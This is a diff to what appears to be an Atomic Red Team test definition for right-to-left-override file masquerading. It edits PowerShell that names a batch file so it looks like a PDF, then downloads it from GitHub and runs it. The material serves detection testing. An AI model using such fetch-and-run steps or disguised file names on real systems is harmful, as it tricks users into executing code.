@@ -29,7 +29,8 @@ atomic_tests:
       Start-Process -FilePath $fileloc -Wait
     cleanup_command: |-
       $rtlo = [char]0x202E
-      $fileloc = Join-Path "#{fileloc}" ("evil_batch" + $rtlo + "fdp.bat")
+      $filepath = #{fileloc}
+      $fileloc = Join-Path "$filepath" ("evil_batch" + $rtlo + "fdp.bat")
       Remove-Item -Path $fileloc -Force -ErrorAction SilentlyContinue
     name: powershell
     elevation_required: false
@@ -46,12 +47,14 @@ atomic_tests:
   executor:
     command: |-
       $rtlo = [char]0x202E
-      $fileloc = Join-Path "#{fileloc}" ("evil_batch" + $rtlo + "fdp.bat")
-      Invoke-WebRequest -Uri "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1036.002/src/evil_batch.bat" -OutFile $fileloc -UseBasicParsing
+      $filepath = #{fileloc}
+      $fileloc = Join-Path "$filepath" ("evil_batch" + $rtlo + "fdp.bat")
+      Invoke-WebRequest -Uri "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1036.002/src/evil_batch.bat" -OutFile $fileloc -UseBasicParsing | Out-Null
       Start-Process -FilePath $fileloc
     cleanup_command: |-
       $rtlo = [char]0x202E
-      $fileloc = Join-Path "#{fileloc}" ("evil_batch" + $rtlo + "fdp.bat")
+      $filepath = #{fileloc}
+      $fileloc = Join-Path "$filepath" ("evil_batch" + $rtlo + "fdp.bat")
       Remove-Item -Path $fileloc -Force -ErrorAction SilentlyContinue
     name: powershell
     elevation_required: false
